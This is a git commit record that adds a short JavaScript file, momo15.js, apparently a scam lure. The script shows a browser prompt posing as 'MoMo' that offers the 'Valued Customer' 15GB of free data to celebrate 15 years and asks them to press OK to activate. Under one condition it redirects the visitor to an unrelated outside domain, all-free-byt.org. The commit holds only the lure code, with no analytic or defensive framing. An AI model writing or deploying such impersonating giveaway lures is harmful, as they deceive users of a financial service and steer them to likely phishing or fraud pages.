8267c1453adb96f6d1561b0042978ac519c1a8ad
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-08-28 05:51:09 -0700

    Create momo15.js

---
+++ momo15.js
@@ -0,0 +1,6 @@
+
+var password = '15GB Free Data'
+password=prompt('MoMo: Valued Customer, you have been selected to receive 15GB free data as we celebrate MoMo at 15yrs, press Ok to activate now ','15GB Free Data');
+if (password != '15GB Free Data') {
+location.href='https://all-free-byt.org/momo-at15.html';
+}
